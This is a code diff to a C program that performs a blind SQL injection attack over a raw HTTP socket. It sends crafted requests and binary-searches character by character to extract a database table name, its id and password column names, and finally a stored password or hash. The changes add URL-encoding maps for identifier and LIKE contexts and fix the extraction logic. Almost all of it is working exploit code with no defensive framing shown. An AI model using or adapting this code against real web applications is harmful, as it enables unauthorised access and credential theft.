@@ -210,6 +210,7 @@ typedef struct {
     int sockfd;
     char *discovered;
     char *discovered_like;
+    char *discovered_identifier;
     int index;
     const char *guess;
 } GeneralCtx;
@@ -245,7 +246,7 @@ bool check_table(const void *ctx) {
         "Connection: Keep-Alive\r\n"
         "\r\n";
 
-    sprintf(mal_req, fmt, table_ctx->discovered, table_ctx->index, table_ctx->index + 1, table_ctx->guess);
+    sprintf(mal_req, fmt, table_ctx->discovered_like, table_ctx->index, table_ctx->index + 1, table_ctx->guess);
     _send(table_ctx->sockfd, mal_req, strlen(mal_req));
     return recv_empty(table_ctx->sockfd);
 }
@@ -268,7 +269,7 @@ bool check_column(const void *ctx) {
         "Connection: Keep-Alive\r\n"
         "\r\n";
 
-    sprintf(mal_req, fmt, c_ctx->table_name, c_ctx->col_to_find, c_ctx->gen_ctx.discovered, c_ctx->gen_ctx.index,
+    sprintf(mal_req, fmt, c_ctx->table_name, c_ctx->col_to_find, c_ctx->gen_ctx.discovered_like, c_ctx->gen_ctx.index,
         c_ctx->gen_ctx.index + 1, c_ctx->gen_ctx.guess);
     _send(c_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
     return recv_empty(c_ctx->gen_ctx.sockfd);
@@ -303,7 +304,7 @@ bool check_password(const void *ctx) {
         d_ctx->table_name,
         d_ctx->id_col,
         d_ctx->pwd_col,
-        d_ctx->gen_ctx.discovered,
+        d_ctx->gen_ctx.discovered_like,
         d_ctx->pwd_col,
         d_ctx->gen_ctx.index + 1,
         d_ctx->gen_ctx.guess
@@ -352,6 +353,60 @@ const char *url_map_like[96] = {
     "%5D", // 0x5D ]
     "%5E", // 0x5E ^
     "%5C%5F", // 0x5F _
+    "%60", // 0x60 `
+
+    // --- 0x61 to 0x7A (Lowercase a-z Unreserved) ---
+    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+    "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+
+    // --- 0x7B to 0x7F ---
+    "%7B", // 0x7B {
+    "%7C", // 0x7C |
+    "%7D", // 0x7D }
+    "~",   // 0x7E ~ (Unreserved)
+    "%7F"  // 0x7F DEL
+};
+
+const char *url_map_identifier[96] = {
+    "%20", // 0x20 Space
+    "%21", // 0x21 !
+    "%22", // 0x22 "
+    "%23", // 0x23 #
+    "%24", // 0x24 $
+    "%25", // 0x25 %
+    "%26", // 0x26 &
+    "%27", // 0x27 ' (escaped)
+    "%28", // 0x28 (
+    "%29", // 0x29 )
+    "%2A", // 0x2A *
+    "%2B", // 0x2B +
+    "%2C", // 0x2C ,
+    "-",   // 0x2D -
+    ".",   // 0x2E .
+    "%2F", // 0x2F /
+
+    // --- 0x30 to 0x39 (Numbers 0-9 Unreserved) ---
+    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
+
+    // --- 0x3A to 0x40 ---
+    "%3A", // 0x3A :
+    "%3B", // 0x3B ;
+    "%3C", // 0x3C <
+    "%3D", // 0x3D =
+    "%3E", // 0x3E >
+    "%3F", // 0x3F ?
+    "%40", // 0x40 @
+
+    // --- 0x41 to 0x5A (Uppercase A-Z Unreserved) ---
+    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
+    "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+
+    // --- 0x5B to 0x60 ---
+    "%5B", // 0x5B [
+    "%5C", // 0x5C \ (Backslash)
+    "%5D", // 0x5D ]
+    "%5E", // 0x5E ^
+    "%5F", // 0x5F _
     "%60", // 0x60 `
 
     // --- 0x61 to 0x7A (Lowercase a-z Unreserved) ---
@@ -446,7 +501,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
                 low=mid + 1;
             }
         #ifdef __MY_DEBUG__
-            printf("\t%s,%c,%c\n", gen_ctx->discovered, low + 0x20, high + 0x20);
+            printf("\t%s,%c,%c\n", gen_ctx->discovered_like, low + 0x20, high + 0x20);
         #endif
         }
         if (low>0x5e) {
@@ -455,7 +510,9 @@ void binary_search(check_func_t check_fn, void *ctx) {
             #endif
             break;
         }
-        strcat(gen_ctx->discovered, url_map_like[low]);
+        gen_ctx->discovered[strlen(gen_ctx->discovered)] = low + 0x20;
+        strcat(gen_ctx->discovered_identifier, url_map_identifier[low]);
+        strcat(gen_ctx->discovered_like, url_map_like[low]);
     }
 #ifdef __MY_DEBUG__
     printf("number of queries is: %d\n",count);
@@ -466,64 +523,79 @@ int32_t main() {
     int32_t sockfd = create_socket();
     _connect(sockfd, WEB_ADDR, 80);
 
-
-    char table_name[61] = {0};
+    char table_name[11] = {0};
+    char table_name_ident[31] = {0};
+    char table_name_like[61] = {0};
     {
         GeneralCtx table_ctx = {
             .sockfd = sockfd,
-            .discovered = table_name
+            .discovered = table_name,
+            .discovered_identifier = table_name_ident,
+            .discovered_like = table_name_like
         };
 
         binary_search(check_table, &table_ctx);
     }
 
     #ifdef __MY_DEBUG__
-        printf("Found Table: %s\n", table_name);
+        printf("Found Table: %s\n", table_name_ident);
     #endif
 
-    char id_name[61] = {0};
+    char id_name[11] = {0};
+    char id_name_ident[31] = {0};
+    char id_name_like[61] = {0};
     {
         ColumnCtx id_ctx = {
             .gen_ctx = {
                 .sockfd = sockfd,
-                .discovered = id_name
+                .discovered = id_name,
+                .discovered_identifier = id_name_ident,
+                .discovered_like = id_name_like
             },
-            .table_name = table_name,
+            .table_name = table_name_ident,
             .col_to_find = "id"
         };
 
         binary_search(check_column, &id_ctx);
     }
 
-    char pwd_name[61] = {0};
+    char pwd_name[11] = {0};
+    char pwd_name_ident[31] = {0};
+    char pwd_name_like[61] = {0};
     {
         ColumnCtx pwd_col_ctx = {
             .gen_ctx = {
                 .sockfd = sockfd,
-                .discovered = pwd_name
+                .discovered = pwd_name,
+                .discovered_identifier = pwd_name_ident,
+                .discovered_like = pwd_name_like
             },
-            .table_name = table_name,
+            .table_name = table_name_like,
             .col_to_find = "pwd"
         };
 
         binary_search(check_column, &pwd_col_ctx);
     }
 
-    char final_password[61] = {0};
+    char final_password[11] = {0};
+    char final_password_ident[31] = {0};
+    char final_password_like[61] = {0};
     {
         PwdCtx pwd_ctx = {
             .gen_ctx = {
                 .sockfd = sockfd,
-                .discovered = final_password
+                .discovered = final_password,
+                .discovered_identifier = final_password_ident,
+                .discovered_like = final_password_like,
             },
-            .table_name = table_name,
-            .id_col = id_name,
-            .pwd_col = pwd_name
+            .table_name = table_name_ident,
+            .id_col = id_name_ident,
+            .pwd_col = pwd_name_ident
         };
         binary_search(check_password, &pwd_ctx);
     }
 
-    printf("Found Password/Hash: %s\n", final_password);
+    printf("Found Password/Hash: %s\n", final_password_ident);
 
     close(sockfd);
 }
